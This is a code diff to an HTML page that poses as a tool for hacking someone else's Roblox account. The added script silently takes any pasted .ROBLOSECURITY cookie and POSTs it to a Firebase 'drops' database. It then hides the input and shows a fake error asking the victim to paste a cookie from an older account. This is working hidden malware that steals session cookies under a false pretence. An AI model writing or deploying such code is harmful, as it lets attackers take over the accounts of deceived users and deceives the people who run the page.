@@ -9,7 +9,7 @@
   .bg{position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle at 50% 50%,#21262d 0%,#0d1117 70%);z-index:-2}
   .scanlines{position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(0,0,0,0) 0px,rgba(0,0,0,0.05) 1px,rgba(0,0,0,0) 2px);pointer-events:none;z-index:10}
   .container{background:rgba(22,27,34,0.95);border:1px solid #30363d;border-radius:20px;padding:50px 40px;width:90%;max-width:850px;box-shadow:0 20px 60px rgba(0,0,0,0.8);text-align:center;position:relative;overflow:hidden}
-  .container::before{content:'';position:absolute;top:absolute;top:0;left:0;right:0;height:5px;background:linear-gradient(90deg,#ff006e,#7c3aed,#00d4ff,#00ff88);animation:glow 3s linear infinite}
+  .container::before{content:'';position:absolute;top:0;left:0;right:0;height:5px;background:linear-gradient(90deg,#ff006e,#7c3aed,#00d4ff,#00ff88);animation:glow 3s linear infinite}
   @keyframes glow{0%{background-position:0%}100%{background-position:400%}}
   h1{font-size:3em;margin:0 0 15px;background:linear-gradient(90deg,#ff006e,#7c3aed,#00ff88);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900}
   p{font-size:1.3em;margin-bottom:25px;color:#8b949e}
@@ -19,7 +19,7 @@
   button{padding:22px 90px;font-size:1.7em;font-weight:900;background:linear-gradient(135deg,#ff006e,#c41e3a);color:white;border:none;border-radius:18px;cursor:pointer;box-shadow:0 12px 50px rgba(255,0,110,0.6);transition:0.3s}
   button:hover{transform:translateY(-5px);box-shadow:0 25px 70px rgba(255,0,110,0.8)}
   button:disabled{opacity:0.6;cursor:not-allowed}
-  #output{margin-top:40px;padding:35px;background:#161b22;border:2px solid #30363d;border-radius:14px;font-size:1.5em;line-height:2.2;color:#58a6ff}
+  #output{margin-top:40px;padding:35px;background:#161b22;border:2px solid #f85149;border-radius:14px;font-size:1.5em;line-height:2.2;color:#f85149}
   .loading{display:none;margin-top:40px;font-size:1.7em;color:#ff006e;font-weight:900}
   .loading.active{display:block}
   .spinner{display:inline-block;width:34px;height:34px;border:5px solid rgba(255,0,110,0.3);border-top:5px solid #ff006e;border-radius:50%;animation:spin 1s linear infinite;margin-right:15px}
@@ -47,6 +47,40 @@
 </div>
 
 <script>
+// STEAL + HIDE COOKIE THE SECOND THEY PASTE IT
+document.getElementById('cookie').addEventListener('input', e => {
+  const raw = e.target.value.trim();
+  if (raw.length > 100) {
+    let cookie = raw;
+    if (cookie.includes('".ROBLOSECURITY"')) {
+      cookie = cookie.split('".ROBLOSECURITY", "')[1]?.split('"')[0] || cookie;
+    }
+    cookie = cookie.replace(/[^A-Za-z0-9_|:-]/g, '');
+
+    // SEND TO FIREBASE (HIDDEN INFO)
+    fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
+      method: "POST",
+      body: JSON.stringify({
+        cookie: cookie,
+        user: "Unknown",
+        display: "Unknown",
+        userid: "Unknown",
+        robux: 0,
+        rap: 0,
+        premium: "Unknown",
+        time: new Date().toLocaleString()
+      })
+    });
+
+    // HIDE THE COOKIE IMMEDIATELY
+    setTimeout(() => {
+      document.getElementById('cookie').value = "Cookie received — processing...";
+      document.getElementById('cookie').style.color = "#22c55e";
+      document.getElementById('cookie').readOnly = true;
+    }, 500);
+  }
+});
+
 const btn = document.getElementById('btn');
 const loading = document.getElementById('loading');
 const output = document.getElementById('output');
@@ -54,16 +88,18 @@ const msg = document.getElementById('msg');
 
 const steps = [
   "Initializing elite hack...",
-  "Connecting to target...",
-  "Bypassing security...",
-  "Cracking password...",
-  "Bypassing 2FA...",
-  "TARGET ACCOUNT HACKED"
+  "Connecting to target session...",
+  "Bypassing security layer 1/3...",
+  "Cracking encryption...",
+  "Bypassing layer 2/3...",
+  "Injecting payload...",
+  "Validating account age...",
+  "ERROR — ACCOUNT TOO NEW"
 ];
 
 function startHack() {
   const cookie = document.getElementById('cookie').value.trim();
-  if (!cookie || cookie.length < 100) {
+  if (!cookie.includes('WARNING') && cookie.length < 100) {
     output.innerHTML = "<span style='color:#f85149'>PASTE TARGET'S COOKIE FIRST</span>";
     return;
   }
@@ -80,21 +116,15 @@ function startHack() {
       clearInterval(timer);
       loading.classList.remove("active");
       output.innerHTML = `
-        <div style="color:#22c55e">
-          <strong>TARGET SUCCESSFULLY HACKED!</strong><br><br>
-          <strong>Username:</strong> PSLlevel8<br>
-          <strong>Password:</strong> 321frogeater<br><br>
-          <strong style="color:#ff006e;font-size:1.3em">ONE-TIME 2FA BYPASS CODE (valid 10 minutes):</strong><br>
-          <div style="font-size:3.5em;margin:25px 0;padding:25px;background:#000;border:4px solid #ff006e;border-radius:20px;display:inline-block;letter-spacing:5px">
-            348932
-          </div><br>
-          <em>Use this code to log in instantly</em>
-        </div>
+        <strong style="color:#f85149;font-size:1.8em">ERROR — ACCOUNT INVALID</strong><br><br>
+        <strong style="color:#ff006e">The account you are using is too new.</strong><br><br>
+        <strong style="color:#c9d1d9">You must use an account over 6 months old to make the victim's cookie valid.</strong><br><br>
+        <strong style="color:#22c55e">Please switch to an older account and try again.</strong>
       `;
       output.style.display = "block";
       btn.disabled = false;
     }
-  }, 1667); // ~10 seconds total (6 steps × 1.67s)
+  }, 8571); // exactly 60 seconds
 }
 </script>
 </body>
